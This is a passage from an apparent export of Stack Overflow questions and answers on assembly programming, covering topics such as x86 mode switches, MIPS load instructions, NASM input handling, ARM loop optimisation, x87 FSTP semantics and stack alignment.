","<p>If you use gcc you can do <code>gcc -O2 -S -c foo.c</code> according to <a href=""http://www.delorie.com/djgpp/v2faq/faq8_20.html"" rel=""noreferrer"">this</a> page to get the output assembly in a human readable form.</p>
","2887822"
"CPU Switches from User mode to Kernel Mode : What exactly does it do? How does it makes this transition?","12205","","<p><strong>CPU</strong> Switches from User mode to Kernel Mode : What exactly does it do? How does it makes this transition?</p>

<p><strong>EDIT:</strong></p>

<p>Even if it is architecture dependent please provide me with an answer. The architecture is up to you. Tell me for the architecture you know about.</p>

<p>I want to get an idea about what all things will be involved in it. </p>
","<p>Note: this is mostly relevant to x86 architecture. Here's a somewhat simplified explanation.</p>

<p>The transition is usually caused by one of the following:</p>

<ul>
<li>Fault (e.g. a page fault or some other exception caused by executing an instruction)</li>
<li>Interrupt (e.g. a keyboard interrupt or I/O finishing)</li>
<li>Trap (e.g. a system call)</li>
</ul>

<p>What normally happens is that system checks the Interrupt Descriptor Table (IDT). Each exception (interrupt, fault, etc.) has a number associated with it which is used to index into this table.</p>

<p>From this table the CPU can determine the interrupt handler to run.</p>

<p>As part of the transition the following changes (generally) take effect:</p>

<ul>
<li>Switch to Kernel stack</li>
<li>EFLAGS are saved</li>
<li>Code segment selector and EIP are saved.</li>
<li>stack segment selector and stack pointer are saved </li>
<li>Start executing the interrupt handler</li>
<li>The general purpose registers are saved (handler's job)</li>
<li>Segment selectors are changed to Kernel ones (handler's job)</li>
</ul>

<p>You're now in kernel mode. </p>

<p>Hope that helps :)</p>
","2484895"
"Good reference for x86 assembly instructions","12191","","<p>I looking for a good reference for x86 assembly instructions with all the information about the instructions like the opcode, size etc.</p>
","<p>You might want to have a look at the <a href=""http://www.intel.com/products/processor/manuals/"" rel=""noreferrer"">Intel Architecture Developer's Manuals</a>, especially volume 1 (basic architecture) and volumes 2A and 2B (instruction set reference).</p>
","4568866"
"Is it possible to write an if statement in x86 assembly language?","12155","","<p>Is it possible to mimic an if-statment in x86 assembly language (using masm syntax)? I want to do something like this in x86 assembly language, but I'm not sure which operator I should use to mimic an if-else statement. Should I use the <code>jl</code> instruction, or the <code>cmp</code> instruction, or some other instruction?</p>

<pre><code>int i = 2;
int j = 3;
if(i &gt; j){
    i = 1;
}
else{
    i = 4;
}
</code></pre>
","<p>A combination of <code>cmp</code> and <code>jcc</code> (that is, conditional jump) instructions will do. Look up your CPU manual.</p>
","14986192"
"MIPS: The Equivalent of la instruction without using pseudo codes?","12120","","<p>The reference says the pseudo code for la (load address) is translated to:</p>

<pre><code>Pseudo : la $1, Label   

lui $1, Label[31:16]
ori $1,$1, label[15:0]
</code></pre>

<p>but when I try to assemble the code in MARS I get the error:</p>

<p><strong>""Invalid language element: 16]</strong></p>

<p>and if I remove the [31:16] part I get </p>

<p><strong>""Label"": operand is of incorrect type</strong></p>

<p>Any idea?</p>
","<p>That means that the 16 most significant bits of label are set in $1. Then, 16 less significant bits are or'ed with the 16 most significant bits.</p>

<p><a href=""http://www.mrc.uidaho.edu/mrc/people/jff/digital/MIPSir.html"" rel=""nofollow noreferrer"">Here</a> you can find the description of the lui instruction. It loads 16 msb bits of the label address on the register and zeroes 16 lsb.</p>

<p>This way, you can load 32 bit address (in mips32) with 32 bit instructions.</p>

<p>Its in no way intended to be ""real code"". The [31:16] / [15:0] part is not valid mips, and is only there for you to understand bit movements.</p>

<p>Edit:
In response to your comment, you would have to know the address you want to load using the lui instruction. To do this, you could use a label to indicate the desired address. 
For example</p>

<pre><code>.data 
my_var: .asciiz ""This is a nul terminated string""

.text
        andi $a0,$a0,0x0000ffff
        lui $a0,my_var
        ori $a0,$a0,my_var
</code></pre>
","1535264"
"Disassemble default iOS apps with otool","12115","","<p>When I try to disassemble the stock iOS apps (not app store ones) with otool it isn't split into different methods. It's just one massive section. Here's the command I'm using:
<br><code>otool -tV theApp.app/theApp >~/Desktop/output.txt</code><br>
Is there a way to get the disassembly split into methods?</p>
","<p>No, there isn't. Those applications have been stripped, which means they contain no information about where functions begin or end. However, since objective-c is dynamic, any objective-c methods will have their name and address in the objective-c segment. You can get this information using <code>otool -ov</code>, but it is easier to interpret it if you use <a href=""http://code.google.com/p/networkpx/wiki/class_dump_z"" rel=""noreferrer"">class-dump-z</a>, which provides objective-c headers and will include the addresses of each method if you use the <code>-A</code> option. After you have the addresses, you can go through your file and separate it into methods manually.</p>
","7458688"
"Quickly find whether a value is present in a C array?","12115","","<p>I have an embedded application with a time-critical ISR that needs to iterate through an array of size 256 (preferably 1024, but 256 is the minimum) and check if a value matches the arrays contents. A <code>bool</code> will be set to true is this is the case. MCU is a NXP LPC4357, ARM Cortex M4 core, compiler is GCC. I already have combined optimisation level 2 (3 is slower) and placing the function in RAM instead of flash. I also use pointer arithmetic and a <code>for</code> loop, which does down-counting instead of up (checking if <code>i!=0</code> is faster than checking if <code>i&lt;256</code>). All in all, I end up with a duration of 12.5us which has to be reduced drastically to be feasible. This is the (pseudo) code I use now:</p>

<pre><code>uint32_t i;
uint32_t *array_ptr = &amp;theArray[0];
uint32_t compareVal = 0x1234ABCD;
bool validFlag = false;

for (i=256; i!=0; i--)
{
    if (compareVal == *array_ptr++)
    {
         validFlag = true;
         break;
     }
}
</code></pre>

<p>What would be the absolute fastest way to do this? Using inline assembly is allowed. Other 'less elegant' tricks also allowed.</p>
","<p>In situations where performance is of utmost importance, the C compiler will most likely not produce the fastest code compared to what you can do with hand tuned assembly language. I tend to take the path of least resistance - for small routines like this, I just write asm code and have a good idea how many cycles it will take to execute. You may be able to fiddle with the C code and get the compiler to generate good output, but you may end up wasting lots of time tuning the output that way. Compilers (especially from Microsoft) have come a long way in the last few years, but they are still not as smart as the compiler between your ears because you're working on your specific situation and not just a general case. The compiler may not  make use of certain instructions (e.g. LDM) that can speed this up, and it's unlikely to be smart enough to unroll the loop. Here's a way to do it which incorporates the 3 ideas I mentioned in my comment: Loop unrolling, cache prefetch and making use of the multiple load (ldm) instruction. The instruction cycle count comes out to about 3 clocks per array element, but this doesn't take into account memory delays.</p>

<p><strong>Theory of operation:</strong> ARM's CPU design executes most instructions in one clock cycle, but the instructions are executed in a pipeline. C compilers will try to eliminate the pipeline delays by interleaving other instructions in between. When presented with a tight loop like the original C code, the compiler will have a hard time hiding the delays because the value read from memory must be immediately compared. My code below alternates between 2 sets of 4 registers to significantly reduce the delays of the memory itself and the pipeline fetching the data. In general, when working with large data sets and your code doesn't make use of most or all of the available registers, then you're not getting maximum performance.</p>

<pre><code>; r0 = count, r1 = source ptr, r2 = comparison value

   stmfd sp!,{r4-r11}   ; save non-volatile registers
   mov r3,r0,LSR #3     ; loop count = total count / 8
   pld [r1,#128]
   ldmia r1!,{r4-r7}    ; pre load first set
loop_top:
   pld [r1,#128]
   ldmia r1!,{r8-r11}   ; pre load second set
   cmp r4,r2            ; search for match
   cmpne r5,r2          ; use conditional execution to avoid extra branch instructions
   cmpne r6,r2
   cmpne r7,r2
   beq found_it
   ldmia r1!,{r4-r7}    ; use 2 sets of registers to hide load delays
   cmp r8,r2
   cmpne r9,r2
   cmpne r10,r2
   cmpne r11,r2
   beq found_it
   subs r3,r3,#1        ; decrement loop count
   bne loop_top
   mov r0,#0            ; return value = false (not found)
   ldmia sp!,{r4-r11}   ; restore non-volatile registers
   bx lr                ; return
found_it:
   mov r0,#1            ; return true
   ldmia sp!,{r4-r11}
   bx lr
</code></pre>

<p><strong>Update:</strong>
There are a lot of skeptics in the comments who think that my experience is anecdotal/worthless and require proof. I used GCC 4.8 (from the Android NDK 9C) to generate the following output with optimization -O2 (all optimizations turned on <strong>including loop unrolling</strong>). I compiled the original C code presented in the question above. Here's what GCC produced:</p>

<pre><code>.L9: cmp r3, r0
     beq .L8
.L3: ldr r2, [r3, #4]!
     cmp r2, r1
     bne .L9
     mov r0, #1
.L2: add sp, sp, #1024
     bx  lr
.L8: mov r0, #0
     b .L2
</code></pre>

<p>GCC's output not only doesn't unroll the loop, but also wastes a clock on a stall after the LDR. It requires at least 8 clocks per array element. It does a good job of using the address to know when to exit the loop, but all of the magical things compilers are capable of doing are nowhere to be found in this code. I haven't run the code on the target platform (I don't own one), but anyone experienced in ARM code performance can see that my code is faster.</p>

<p><strong>Update 2:</strong>
I gave Microsoft's Visual Studio 2013 SP2 a chance to do better with the code. It was able to use NEON instructions to vectorize my array initialization, but the linear value search as written by the OP came out similar to what GCC generated (I renamed the labels to make it more readable):</p>

<pre><code>loop_top:
   ldr  r3,[r1],#4  
   cmp  r3,r2  
   beq  true_exit
   subs r0,r0,#1 
   bne  loop_top
false_exit: xxx
   bx   lr
true_exit: xxx
   bx   lr
</code></pre>

<p>As I said, I don't own the OP's exact hardware, but I will be testing the performance on an nVidia Tegra 3 and Tegra 4 of the 3 different versions and post the results here soon.</p>

<p><strong>Update 3:</strong>
I ran my code and Microsoft's compiled ARM code on a Tegra 3 and Tegra 4 (Surface RT, Surface RT 2). I ran 1000000 iterations of a loop which fails to find a match so that everything is in cache and it's easy to measure.</p>

<pre><code>             My Code       MS Code
Surface RT    297ns         562ns
Surface RT 2  172ns         296ns  
</code></pre>

<p>In both cases my code runs almost twice as fast. Most modern ARM CPUs will probably give similar results.</p>
","25662379"
"How do I get user input with NASM?","12091","","<p>The program needs to take in a simple string from the user and display it back. I have gotten the program to take input from the user but I can't seem to store it. Here is what I have so far:</p>

<pre><code>BITS 32
global _main
section .data

prompt db ""Enter a string: "", 13, 10, '$'
input resd 1 ; something I can using to store the users input.

name db ""Name: ******"", 13, 10,'$'
StudentID db ""********"", 13, 10, '$'
InBoxID db ""*************"", 13, 10, '$'
Assignment db ""************"", 13, 10, '$'
version db ""***************"", 13, 10, '$'

section .text
_main:

mov ah, 9
mov edx, prompt
int 21h
mov ah, 08h
while:
    int 21h
            ; some code that should store the input.
    mov [input], al
    cmp al, 13
    jz endwhile
    jmp while
endwhile:

mov ah, 9
    ; displaying the input.

mov edx, name
int 21h
mov edx, StudentID
int 21h
mov edx, InBoxID
int 21h
mov edx, Assignment
int 21h
mov edx, version
int 21h
ret
</code></pre>

<p>I am assembling this using NASM.</p>
","<p>You're only reading the characters without storing them. Instead of storing into that 'input', you should store AL either directly into StudentID/InBoxID/Assignment/Version. You could take advantage of their relative positions in memory and write a single loop to fill all of them, as in a contiguous space.</p>

<p>It could go like this:</p>

<pre><code>; For each string already padded with 13, 10, $
; at the end, use the following:
mov ah, 08h
mov edi, string
mov ecx, max_chars
cld
while:
        int 21h
        stosb         ; store the character and increment edi
        cmp ecx, 1    ; have we exhausted the space?
        jz out
        dec ecx
        cmp al, 13
        jz terminate  ; pad the end
        jmp while
terminate:
        mov al, 10
        stosb
        mov al, '$'
        stosb
out:
        ; you can ret here if you wish
</code></pre>

<p>I didn't test, so it might have mistakes in it.</p>

<p>Or you could use other DOS functions, specifically <a href=""http://lrs.uni-passau.de/support/doc/interrupt-57/RB-2497.HTM"" rel=""nofollow noreferrer"">INT21h/0Ah</a>. It could be more optimal and/or easier.</p>
","523242"
"MIPS floating-point: swc1 vs. s.s","12067","","<p>I'm doing some work involving <code>MIPS</code> assembly, and I keep coming across these four floating-point load/store pseudoinstructions: <code>l.s</code>, <code>l.d</code>, <code>s.s</code>, <code>s.d</code>. I found some documentation online and figured out that there are four ""actual"" instructions that seem to do the same thing: <code>lwc1</code>, <code>ldc1</code>, <code>swc1</code>, and <code>sdc1</code>.</p>

<p>My only question is, what's the difference? As far as I can tell, both sets of instructions do exactly the same thing. Do the pseudos maybe exist just because they're easier to read?</p>

<p>Thanks in advance for any insight.</p>
","<blockquote>
  <p>My only question is, what's the difference? As far as I can tell, both sets of instructions do exactly the same thing.</p>
</blockquote>

<p>Yes, you're right. The only difference that could appear is when a pseudo-instruction is translated to more than one ""real"" instruction.</p>

<blockquote>
  <p>Do the pseudos maybe exist just because they're easier to read?</p>
</blockquote>

<p>Again, yes. That's <strong>why</strong> they exist. They give the illusion of a more expressive instruction set. Quoting <a href=""http://books.google.com.py/books?id=1lD9LZRcIZ8C&amp;pg=PA107&amp;lpg=PA107&amp;dq=translate+pseudoinstruction+mips&amp;source=bl&amp;ots=o5A1raCiLD&amp;sig=IotEaTSX_BlOigOSwJCeyrXO4yw&amp;hl=es&amp;ei=645nSu_VAYWBtwfLpbn1Dw&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=4"" rel=""nofollow noreferrer"">Computer organization and design / Patterson &amp; Hennessy</a>:</p>

<blockquote>
  <p>... the assembler can also treat common variations of machine language instructions as if they were instructions in their own right. The hardware need not implement these instructions; however, their appearance in aassembly language simplifies translation and programming. ...</p>
</blockquote>

<p>Given your example, it's more ""clear"" to say:</p>

<pre><code>l.s $f2, 24(t1)       # Load Single contained in 24(t1) to $f2
</code></pre>

<p>than</p>

<pre><code>lwc1 $f2, 24(t1)      # Load Word into Coprocessor 1 from 24(t1) to $f2
</code></pre>

<p>as well as you can understand better:</p>

<pre><code>move $7, $18        # move contents of $18 to $7
</code></pre>

<p>than</p>

<pre><code>add $7, $18, $0
</code></pre>

<p>For me, it's just be helped by mnemonics to get better legible code.</p>
","1168712"
"How do I access the state of individual bits of a word in MIPS?","12060","","<p>I'm writing a program and I need to determine if bits 3 and 6 are set.  I know that I can rotate a word or left/right shift it.</p>

<p>But how do I access individual bit's state?  Do I use a bitwise operator like and/xor?</p>
","<p>You would do a bitwise and with 0x08 and 0x40 (presuming bit 0 is the lowest order bit).  You would use the andi instruction to do this.</p>

<p>If $t0 is the value you want to test:</p>

<pre><code>andi $t1, $t0, 0x08
andi $t2, $t0, 0x40
</code></pre>

<p>$t1 will be non-zero if bit 3 is set, $t2 will be non-zero if bit 6 is set.</p>
","750031"
"Declaring Arrays In x86 Assembly","11991","","<p>I am learning Assembly and I need to make a large array. I have looked around at how to declare arrays and I have come across this.</p>

<pre><code>array db 10 dup(?)
</code></pre>

<p>Where an array of 10 uninitialized bytes is declared. I tried this and tried to assemble it and get ""error: comma expected after operand 1"". I realized that the '?' is not supported in x86 so I made it a constant and got the same error. I ended up doing this.</p>

<pre><code>array db 1, 2, 3, 4, 5, 6, 7, 8, 9, 10
</code></pre>

<p>This worked! But the problem is, I need large arrays (~100-400 integers) and their values will not always be known. I could write out 400 0's but I figured there must be an easier way. So is there a better way to declare large arrays?</p>

<p>I am using x86_64 Assembly on an Intel-Based Macbook Pro with AT&amp;T syntax. </p>
","<p>Did you try <code>TIMES directive</code>.Use this code for declaring an array of size 10</p>

<pre><code>array TIMES 8 DB 0
</code></pre>

<p>Refer to this <a href=""http://www.tutorialspoint.com/assembly_programming/assembly_arrays.htm"" rel=""nofollow"">link</a> for more.</p>
","29545827"
"Assembly mod algorithm on processor with no division operator","11980","","<p>I need to implement a simple macro that finds the modulo of two numbers on a processor that doesn't have a division operator (think ARM). I could use division by repeated subtraction, but I don't know if this was the most efficient or easiest to work with.</p>

<p>Any suggestions? Code would be even more helpful. This particular class has us using a subset of SPARC, so most operations look like this: <code>add r1, r2, rdest</code>. </p>

<p>This particular assignment calls for checking that <code>a mod b == 0</code> or that the remainder of the division is zero. So any hints or suggestions toward an efficient implementation would be most welcome. </p>
","<p>No idea what exact operations you are limited to, but I'd think you'd do long division, something like this, in pseudo-code:</p>

<pre><code>dividend = abs(dividend)
divisor = abs(divisor)
if divisor == 0,
    barf
remainder = dividend
next_multiple = divisor

do
    multiple = next_multiple
    next_multiple = left_shift(multiple, 1)
while next_multiple &lt;= remainder &amp;&amp; next_multiple &gt; multiple

while multiple &gt;= divisor,
    if multiple &lt;= remainder,
        remainder = remainder - multiple
    multiple = right_shift(multiple, 1)
</code></pre>

<p>To actually calculate the quotient (or at least its absolute value), the last part would be something like:</p>

<pre><code>quotient = 0
while multiple &gt;= divisor,
    quotient = left_shift(quotient, 1);
    if multiple &lt;= remainder,
        remainder = remainder - multiple
        quotient = quotient + 1
    multiple = right_shift(multiple, 1)
</code></pre>

<p>None of this is tested, and it is probably riddled with errors.</p>
","938240"
"mov ax, bx vs. mov ax, [bx]","11952","","<p>What is the difference between the following two lines?</p>

<pre><code>mov ax, bx
mov ax, [bx]
</code></pre>

<p>If <code>bx</code> contains the value 100h and the value at memory address 100h is 23, does the second one copy 23 to <code>ax</code>?</p>

<p>Also, what is the difference between the two following lines?</p>

<pre><code>mov ax, 102h ; moves value of 102h into register ax
mov ax, [102h] ; Actual address is DS:0 + 102h
</code></pre>
","<p>Yes.  The operand between the brackets is treated as an address and the value at that memory address if fetched.</p>
","7291941"
"Clarifications on signed/unsigned load and store instructions (MIPS)","11920","","<p>I can't seem to grasp the concept on these stuff, even with the help of Google and a textbook in my hand.</p>

<p>Following the format (opcode, rs, rt, offset)...</p>

<ul>
<li>Do you sign extend the offset before adding it to the value of the address? Or add before extending?</li>
<li>In the case of <strong>lb</strong> and <strong>lbu</strong>, what's the difference? Does it also follow the MIPS arithmetic definition that 'unsigned' just means it won't report an overflow?</li>
<li>Why doesn't <strong>lw</strong> have an unsigned version? Even the store instructions don't have one...</li>
</ul>
","<blockquote>
  <p>In the case of <code>lb</code> and <code>lbu</code>, what's the difference?</p>
</blockquote>

<p>The ""load byte"" instructions <code>lb</code> and <code>lbu</code> load a single byte into the right-most byte of a 32-bit register.  How do you set the upper 24 bits?  The <em>unsigned</em> operation will set them to zero; the signed operation will <a href=""http://en.wikipedia.org/wiki/Sign_extension"" rel=""noreferrer"">sign-extend</a> the loaded byte. </p>

<p>For example, suppose you read the byte <code>0xFF</code> from memory.  <code>lbu</code> will 0-extend this value to <code>0x000000FF</code> and interpret it as 255, while <code>lb</code> will sign-extend it to <code>0xFFFFFFFF</code>, which is interpreted as -1.</p>

<blockquote>
  <p>Why doesn't <code>lw</code> have an unsigned version? Even the store instructions don't have one...</p>
</blockquote>

<p>The ""load word"" instruction (<code>lw</code>), on the other hand, loads a 32-bit quantity into a 32-bit register, so there is no ambiguity, and no need to have a special signed version.</p>

<p>If you are storing less than a full 32-bit word, there is nothing you can do with the extra bits in the register except throw them away (ignore them). </p>

<blockquote>
  <p>Does it also follow the MIPS arithmetic definition that 'unsigned' just means it won't report an overflow?</p>
</blockquote>

<p>I think this convention is only for the add and subtract instructions.  For the other instructions, signed/unsigned indicates whether sign-extension will be performed.</p>

<blockquote>
  <p>Do you sign extend the offset before adding it to the value of the address? Or add before extending?</p>
</blockquote>

<p>If an offset is sign-extended, it only makes sense to do it before adding it to the base address.  I think a review of <a href=""http://en.wikipedia.org/wiki/Two%27s_complement"" rel=""noreferrer"">two's complement</a> arithmetic will make this clear.</p>
","7226383"
"Stack allocation, padding, and alignment","11915","","<p>I've been trying to gain a deeper understanding of how compilers generate machine code, and more specifically how GCC deals with the stack. In doing so I've been writing simple C programs, compiling them into assembly and trying my best to understand the outcome. Here's a simple program and the output it generates:</p>

<p><code>asmtest.c</code>:</p>

<pre><code>void main() {
    char buffer[5];
}
</code></pre>

<p><code>asmtest.s</code>:</p>

<pre><code>pushl   %ebp
movl    %esp, %ebp
subl    $24, %esp
leave
ret
</code></pre>

<p>What's puzzling to me is why 24 bytes are being allocated for the stack. I know that because of how the processor addresses memory, the stack has to be allocated in increments of 4, but if this were the case, we should only move the stack pointer by 8 bytes, not 24. For reference, a buffer of 17 bytes produces a stack pointer moved 40 bytes and no buffer at all moves the stack pointer 8. A buffer between 1 and 16 bytes inclusive moves <code>ESP</code> 24 bytes.</p>

<p>Now assuming the 8 bytes is a necessary constant (what is it needed for?), this means that we're allocating in chunks of 16 bytes. Why would the compiler be aligning in such a way? I'm using an x86_64 processor, but even a 64bit word should only require an 8 byte alignment. Why the discrepancy?</p>

<p>For reference I'm compiling this on a Mac running 10.5 with gcc 4.0.1 and no optimizations enabled.</p>
","<p>It's a gcc feature controlled by <code>-mpreferred-stack-boundary=n</code> where the compiler tries to keep items on the stack aligned to <code>2^n</code>. If you changed <code>n</code> to <code>2</code>, it would only allocate 8 bytes on the stack. The default value for <code>n</code> is <code>4</code> i.e. it will try to align to 16-byte boundaries.</p>

<p>Why there's the ""default"" 8 bytes and then 24=8+16 bytes is because the stack already contains 8 bytes for <code>leave</code> and <code>ret</code>, so the compiled code must adjust the stack first by 8 bytes to get it aligned to 2^4=16.</p>
","1061942"
"Error: invalid instruction suffix for `push'","11910","","<p>am trying to study passing arguments into a function via stack in assmbly. am using fedora 20, 64 bit system.</p>

<p>when i try the following code,</p>

<p>pushl %ebp</p>

<p>popl %ebp</p>

<p>i get the error,
 Error: invalid instruction suffix for `push'</p>

<p>how will i overcome this error!</p>

<p>i compiled it by,
 as -ggstabs -o Function_Stack.o Function_Stack.c</p>
","<p>The error you're getting comes out from a very simple fact : the <code>push</code> instruction in 32-bit mode accepts 16-bit and 32-bit immediates as arguments. However, the <code>push</code> instruction used in 64-bit mode accepts only 16-bit and 64-bit immediates. Since you're clearly compiling your code as 64-bit, the assembler throws an error, since it cannot possibly encode such an instruction. Also, do keep in mind that you force the operand size yourself by adding the <code>l</code> suffix to the <code>push</code> instruction. Everything I just wrote here is exactly the same for <code>pop</code>, except that it accepts registers/memory, not immediates.</p>

<p>However, you also <strong>need</strong> to keep in mind the differences in the ABI between 32-bit and 64-bit Linux systems. The ABI specifies, among other things, how parameters are passed to functions, and how to call the kernel from user-mode applications. Your code is clearly written for 32-bit mode, seeing how it uses the stack for passing arguments and the (very) obsolete <code>int $0x80</code> way of invoking syscalls. In order to learn about the 64-bit ABI, see <a href=""http://www.x86-64.org/documentation/abi.pdf"">this document</a>.</p>

<p>Alternatively, you have the option of compiling 32-bit code on a 64-bit system. Such an executable will work if you have the necessary 32-bit runtime libraries installed on your 64-bit system. Most distributions allow you to do that in different ways. Your compiler, <code>as</code>, has the <code>--32</code> switch for emitting 32-bit code.</p>
","21680219"
"What does FSTP DWORD PTR DS:[ESI+1224] do?","11863","","<p>I am trying to learn more about assembly and disassembly.
My goal is to modify the way a specific address is being written using a debugger (olly). Preferably by incrementing it by a number (20, 50, etc..) I can identify the address of the floating point number (in this case located at <code>33B7420C</code>).</p>

<p>When I set a breakpoint on memory access write it brings me to <code>00809B2E</code> which has the following assembly:</p>

<p><code>FSTP DWORD PTR DS:[ESI+1224]</code></p>

<p>What exactly is it doing in this address? I know that the FPU register has the number i'm looking for but not sure what all this address is doing.</p>

<p>The closest I come to googling is:
<a href=""https://stackoverflow.com/questions/3224524/what-does-mov-eax-dword-ptr-dsesi-mean-and-what-does-it-do"">What does MOV EAX, DWORD PTR DS:[ESI] mean and what does it do?</a></p>

<p>A copy of the registers shows the following:</p>

<pre><code>EAX 00000000
ECX 00A16E40 EZ.00A16E40
EDX FFFFFFFF
EBX 33B74578
ESP 0018FA90
EBP 00000000
ESI 33B72FE8
EDI 33B74578
EIP 00809B2E &lt;EZ.Breakpoint for time&gt;
C 0  ES 002B 32bit 0(FFFFFFFF)
P 0  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 0  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 7EFDD000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00210202 (NO,NB,NE,A,NS,PO,GE,G)
ST0 valid 1150.0000000000000000
ST1 zero  0.0
ST2 zero  0.0
ST3 empty 64.951911926269531250
ST4 empty -13.250000000000000000
ST5 empty 64.951911926269531250
ST6 empty 64.951911926269531250
ST7 empty 0.0239995196461677551
           3 2 1 0      E S P U O Z D I
FST 2927  Cond 0 0 0 1  Err 0 0 1 0 0 1 1 1  (LT)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
</code></pre>

<p>Any help would be appreciated, Thanks!</p>
","<p><code>FSTP</code> stores a floating point number from the top of the floating-point register stack (<code>ST0</code>) to the designated memory region. Using the <code>DWORD</code> modifier means that a 32-bit float will be written. The <code>P</code> suffix indicates that the floating-point register stack will be popped after the operation.</p>

<p>So, in effect, this instruction puts <code>1150.0</code> (as a 32-bit float) at <code>DS:[ESI+1224]</code>, then pops the register stack (which causes <code>ST0 = 0.0</code>, <code>ST1 = 0.0</code>, <code>ST2 = &lt;empty&gt;</code>, etc.).</p>
","12135014"
"C++ string comparison in one clock cycle","11856","","<p>Is it possible to compare whole memory regions in a single processor cycle? More precisely is it possible to compare two strings in one processor cycle using some sort of MMX assembler instruction? Or is <code>strcmp</code>-implementation already based on that optimization?</p>

<p>EDIT:
Or is it possible to instruct C++ compiler to remove string duplicates, so that strings can be compared simply by their memory location? Instead of <code>memcmp(a,b)</code> compared by <code>a==b</code> (assuming that <code>a</code> and <code>b</code> are both native <code>const char*</code> strings).</p>
","<p>Not <em>really</em>. Your typical 1-byte compare instruction takes 1 cycle.
Your best bet would be to use the MMX 64-bit compare instructions( see <a href=""http://www.tommesani.com/MMXComparison.html"" rel=""noreferrer"">this page for an example)</a>. However, those operate on registers, which have to be loaded from memory. The memory loads will significantly damage your time, because you'll be going out to L1 cache at best, which adds some 10x time slowdown*. If you are doing some heavy string processing, you can probably get some nifty speedup there, but again, it's going to hurt.</p>

<p>Other people suggest pre-computing strings. Maybe that'll work for your particular app, maybe it won't. Do you <em>have</em> to compare strings? Can you compare numbers? </p>

<p>Your edit suggests comparing pointers. That's a dangerous situation unless you can specifically guarantee that you won't be doing substring compares(ie, you are comparing some two byte strings: [0x40, 0x50]  with [0x40, 0x42]. Those are not ""equal"", but a pointer compare would say they are). </p>

<p>Have you looked at the gcc strcmp() source? I would suggest that doing that would be the ideal starting place.</p>

<p>* Loosely speaking, if a cycle takes 1 unit, a L1 hit takes 10 units, an L2 hit takes 100 units, and an actual RAM hit takes <em>really long</em>.</p>
","1128259"
"Difference between return from interrupt(RTI) and return from subroutine(RTS)","11842","","<p>I would like to know what is difference between return from interrupt(RTI) and return from subroutine(RTS). Are both are the same or there is any difference between these two?</p>
","<p>Usually return from interrupt restores the flags so that the interrupted code can continue to execute properly.  Return from subroutine does not need to do that instruction is used intentionally in that flow of code and known that the flags are or are not destroyed depending on the architecture.   In architectures that use a stack for the return address it is very apparent.  A return from interrupt will pop the flags then the return address where a return from subroutine will pop only the return address.</p>
","5274282"
"How can I execute MIPS assembly programs on an x86 linux?","11833","","<p>Are there any command line interpreters or any other set of programs around for x86 linux in order to run MIPS assembly programs?</p>

<p>I'd like to be able to write simple MIPS assembly programs and run them from the console on my local machine.</p>

<p>I know of SPIM but it <strike>requires X Windows</strike> and I'm curious if there are better options out there.</p>

<p>Edit: Turns out it doesn't require X Windows. I still have issues with SPIM.  Not the best in my humble opinion.  Qemu / Cross compiled toolchain is a little more work but I have less quirks.</p>
","<p>You will need either a cross compilation toolchain, or to build your own cross binutils.
For a prebuilt toolchain, you can visit <a href=""http://www.codesourcery.com/"" rel=""noreferrer"">code sourcery</a>. If you just want to compile assembly, then all
you need is binutils. There are some guidelines on the <a href=""http://www.linux-mips.org/wiki/Toolchains"" rel=""noreferrer"">Linux Mips</a> wiki</p>

<p>For the emulation part, QEmu would be my choice. </p>
","464469"
"make: Circular dependency dropped","11833","","<p>I've already searched a long time on stackoverflow and other make manuals, websites but cannot find any trailing whitespace or miss usage in make functions. Can you help me solve this warning message ?</p>

<pre><code>make: Circular main.asm.o &lt;- main.asm dependency dropped.
</code></pre>

<p>Makefile:</p>

<pre><code>AS:=yasm
CC:=gcc
OUTPUTDIR:=$(shell pwd)/bin
ASFLAGS:=-g dwarf2 -f elf64 -a x86
CFLAGS:=-g

SOURCES=$(wildcard *.asm)
OBJECTS=$(patsubst %.asm,%.o,$(SOURCES))

%.o: $(SOURCES)
    $(AS) $(ASFLAGS) -o $(OUTPUTDIR)/$(OBJECTS) $&lt;

all: $(OBJECTS)
    $(CC) $(CFLAGS) -o httpd $(OUTPUTDIR)/$(OBJECTS)

clean:
    rm $(OUTPUTDIR)/*
    rm httpd
</code></pre>

<p>main.asm:</p>

<pre><code>section .text
  global main
  extern exit

main:
  mov rdi, 1
    call exit   
</code></pre>

<p>thanks you :)</p>
","<p>Your error is this line:</p>

<pre><code>%.o: $(SOURCES)
</code></pre>

<p>which presumably expands to something like</p>

<pre><code>%.o: main.asm foo.asm bar.asm
</code></pre>

<p>What that means is something very approximately like</p>

<pre><code>main.asm.o: main.asm
foo.asm.o: foo.asm
bar.asm.o: bar.asm
    ....
</code></pre>

<p>That's 'approximately' because you're mixing up the syntax here.</p>

<p>You're confusing an ordinary rule (<code>target: source</code>) with a wildcard rule (<code>%.target: %.source</code>).  What you probably want is</p>

<pre><code>%.o: %.asm
    $(AS) $(ASFLAGS) -o $@ $&lt;
</code></pre>

<p>which teaches Make how to make <code>.o</code> files from <code>.asm</code> files, combined with</p>

<pre><code>httpd: $(SOURCES:.asm=.o)
    $(CC) $(CFLAGS) -o httpd $*
</code></pre>

<p>which tells Make how to combine the various <code>.o</code> files into the <code>httpd</code> executable.  The <code>$(SOURCES:.asm=.o)</code> variable reference expands to a list of <code>.o</code> files as dependencies, and Make now knows how to create those <code>.o</code> files from the corresponding <code>.asm</code> files.</p>
","24919343"
"mov instructions & registers - confusion !","11775","","<p>I am reading ""Computer Systems: A Programmer Perspective"", chapter 3 explains <code>mov</code> instruction, and explanation give in a book confuses me.</p>

<p>give a function (page 142 1's edition)</p>

<pre><code>int exchange( int *xp, int y)
{
    int x = *xp;
    *xp = y;
    return x;
} 
</code></pre>

<p>Assembly code of function's body </p>

<pre><code>movl 8(%ebp), %eax  //Get xp  
movl 12(%ebp), %edx //Get y  
movl (%eax), %ecx   //Get x at *xp  
movl %edx, (%eax)   //Store y at *xp  
movl %ecx, %eax     //Set x as return value
</code></pre>

<p>What confuses me, is what is going to be stored, and where<br>
Here is how I understand this:</p>

<pre><code>movl 8(%ebp), %eax  //Get xp  
</code></pre>

